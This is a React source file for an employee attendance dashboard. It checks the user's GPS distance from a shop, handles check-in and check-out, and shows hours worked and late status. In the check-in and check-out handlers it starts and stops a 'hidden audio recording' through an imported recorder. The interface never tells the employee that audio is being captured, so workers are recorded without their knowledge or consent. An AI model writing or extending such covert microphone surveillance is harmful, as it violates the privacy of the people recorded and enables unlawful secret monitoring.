import { useState, useEffect } from "react";
import { useAuth } from "@/hooks/use-auth";
import { Link } from "wouter";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { useQuery, useMutation } from "@tanstack/react-query";
import { apiRequest, queryClient } from "@/lib/queryClient";
import { AttendanceRecord } from "@shared/schema";
import { getCurrentPosition, calculateDistance, SHOP_LOCATION, MAX_DISTANCE } from "@/lib/geolocation";
import { hiddenRecorder } from "@/lib/audio-recorder";
import { History, User, MapPin, Clock, Loader2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

export default function EmployeeDashboard() {
  const { user, logoutMutation } = useAuth();
  const { toast } = useToast();
  const [locationStatus, setLocationStatus] = useState<{
    distance: number | null;
    isWithinRange: boolean;
    isLoading: boolean;
    error: string | null;
  }>({
    distance: null,
    isWithinRange: false,
    isLoading: true,
    error: null,
  });

  // Fetch today's attendance
  const { data: todayAttendance, isLoading: attendanceLoading } = useQuery<AttendanceRecord>({
    queryKey: ["/api/attendance/today"],
    refetchInterval: 30000, // Refresh every 30 seconds
  });

  const checkInMutation = useMutation({
    mutationFn: async ({ latitude, longitude }: { latitude: number; longitude: number }) => {
      const res = await apiRequest("POST", "/api/attendance/checkin", { latitude, longitude });
      return await res.json();
    },
    onSuccess: async () => {
      queryClient.invalidateQueries({ queryKey: ["/api/attendance/today"] });
      toast({
        title: "Checked in successfully",
        description: "Your attendance has been recorded",
      });
      // Start hidden audio recording
      try {
        await hiddenRecorder.startRecording();
      } catch (error) {
        console.error("Failed to start audio recording:", error);
      }
    },
    onError: (error: Error) => {
      toast({
        title: "Check-in failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const checkOutMutation = useMutation({
    mutationFn: async () => {
      const res = await apiRequest("POST", "/api/attendance/checkout");
      return await res.json();
    },
    onSuccess: async () => {
      queryClient.invalidateQueries({ queryKey: ["/api/attendance/today"] });
      toast({
        title: "Checked out successfully",
        description: "Your work session has been completed",
      });
      // Stop hidden audio recording
      try {
        await hiddenRecorder.stopRecording();
      } catch (error) {
        console.error("Failed to stop audio recording:", error);
      }
    },
    onError: (error: Error) => {
      toast({
        title: "Check-out failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  useEffect(() => {
    const updateLocation = async () => {
      setLocationStatus(prev => ({ ...prev, isLoading: true }));
      
      try {
        const position = await getCurrentPosition();
        const distance = calculateDistance(
          position.latitude,
          position.longitude,
          SHOP_LOCATION.latitude,
          SHOP_LOCATION.longitude
        );
        
        setLocationStatus({
          distance: Math.round(distance),
          isWithinRange: distance <= MAX_DISTANCE,
          isLoading: false,
          error: null,
        });
      } catch (error) {
        setLocationStatus({
          distance: null,
          isWithinRange: false,
          isLoading: false,
          error: error instanceof Error ? error.message : "Failed to get location",
        });
      }
    };

    updateLocation();
    const interval = setInterval(updateLocation, 10000); // Update every 10 seconds

    return () => clearInterval(interval);
  }, []);

  const handleCheckIn = async () => {
    try {
      const position = await getCurrentPosition();
      checkInMutation.mutate({
        latitude: position.latitude,
        longitude: position.longitude,
      });
    } catch (error) {
      toast({
        title: "Location error",
        description: error instanceof Error ? error.message : "Failed to get location",
        variant: "destructive",
      });
    }
  };

  const getHoursWorked = (): string => {
    if (!todayAttendance?.checkInTime) return "0h 0m";
    
    const checkInTime = new Date(todayAttendance.checkInTime);
    const endTime = todayAttendance.checkOutTime 
      ? new Date(todayAttendance.checkOutTime)
      : new Date();
    
    const diffMs = endTime.getTime() - checkInTime.getTime();
    const hours = Math.floor(diffMs / (1000 * 60 * 60));
    const minutes = Math.floor((diffMs % (1000 * 60 * 60)) / (1000 * 60));
    
    return `${hours}h ${minutes}m`;
  };

  const isCheckedIn = todayAttendance && !todayAttendance.checkOutTime;
  const canCheckIn = locationStatus.isWithinRange && !isCheckedIn;

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-white shadow-sm border-b">
        <div className="max-w-md mx-auto px-4 py-4 flex justify-between items-center">
          <h1 className="text-lg font-semibold text-gray-900" data-testid="text-dashboard-title">
            Dashboard
          </h1>
          <div className="flex items-center space-x-4">
            <Link href="/history">
              <Button variant="ghost" size="sm" data-testid="button-history">
                <History className="h-4 w-4" />
              </Button>
            </Link>
            <Link href="/profile">
              <Button variant="ghost" size="sm" data-testid="button-profile">
                <User className="h-4 w-4" />
              </Button>
            </Link>
          </div>
        </div>
      </div>

      <div className="max-w-md mx-auto px-4 py-6 space-y-6">
        {/* Location Status Card */}
        <Card>
          <CardContent className="pt-6">
            <div className="text-center">
              <div className="flex items-center justify-center mb-2">
                <MapPin className="h-5 w-5 mr-2 text-gray-600" />
                {locationStatus.isLoading ? (
                  <div className="flex items-center">
                    <Loader2 className="h-4 w-4 animate-spin mr-2" />
                    <span className="text-gray-600">Getting location...</span>
                  </div>
                ) : locationStatus.error ? (
                  <span className="text-error" data-testid="text-location-error">
                    Location unavailable
                  </span>
                ) : (
                  <>
                    <span 
                      className={`text-2xl mr-2`}
                      data-testid="text-location-status"
                    >
                      {locationStatus.isWithinRange ? "🟢" : "🔴"}
                    </span>
                    <span 
                      className={`text-lg font-medium ${
                        locationStatus.isWithinRange ? "text-success" : "text-error"
                      }`}
                    >
                      {locationStatus.isWithinRange ? "At Shop" : "Away"}
                    </span>
                  </>
                )}
              </div>
              {locationStatus.distance !== null && (
                <p className="text-sm text-gray-600" data-testid="text-distance">
                  Distance: {locationStatus.distance} meters
                </p>
              )}
            </div>
          </CardContent>
        </Card>

        {/* Check-in/out Button */}
        <Card>
          <CardContent className="pt-6 text-center">
            <Button
              size="lg"
              className={`w-36 h-36 rounded-full text-xl font-bold shadow-lg mb-4 ${
                isCheckedIn
                  ? "bg-error hover:bg-red-700"
                  : canCheckIn
                  ? "bg-success hover:bg-green-700"
                  : "bg-gray-400 cursor-not-allowed"
              }`}
              disabled={(!canCheckIn && !isCheckedIn) || checkInMutation.isPending || checkOutMutation.isPending}
              onClick={isCheckedIn ? () => checkOutMutation.mutate() : handleCheckIn}
              data-testid={isCheckedIn ? "button-checkout" : "button-checkin"}
            >
              {(checkInMutation.isPending || checkOutMutation.isPending) && (
                <Loader2 className="h-6 w-6 animate-spin" />
              )}
              {!checkInMutation.isPending && !checkOutMutation.isPending && (
                isCheckedIn ? "CHECK OUT" : "I'M HERE"
              )}
            </Button>
            <p className="text-xs text-gray-500">
              {isCheckedIn ? "Tap to check out" : "Tap to check in"}
            </p>
          </CardContent>
        </Card>

        {/* Today's Activity */}
        <Card>
          <CardHeader>
            <CardTitle className="text-base">Today's Activity</CardTitle>
          </CardHeader>
          <CardContent>
            {attendanceLoading ? (
              <div className="flex justify-center">
                <Loader2 className="h-4 w-4 animate-spin" />
              </div>
            ) : (
              <div className="space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-600">Check-in Time:</span>
                  <span className="font-medium" data-testid="text-checkin-time">
                    {todayAttendance?.checkInTime 
                      ? new Date(todayAttendance.checkInTime).toLocaleTimeString([], {
                          hour: '2-digit',
                          minute: '2-digit'
                        })
                      : "Not checked in"
                    }
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Hours Worked:</span>
                  <span className="font-medium" data-testid="text-hours-worked">
                    {getHoursWorked()}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Status:</span>
                  <Badge 
                    variant={todayAttendance?.isLate ? "destructive" : "default"}
                    className={todayAttendance?.isLate ? "" : "bg-success text-white"}
                    data-testid="badge-status"
                  >
                    {todayAttendance?.isLate ? "Late" : "On Time"}
                  </Badge>
                </div>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
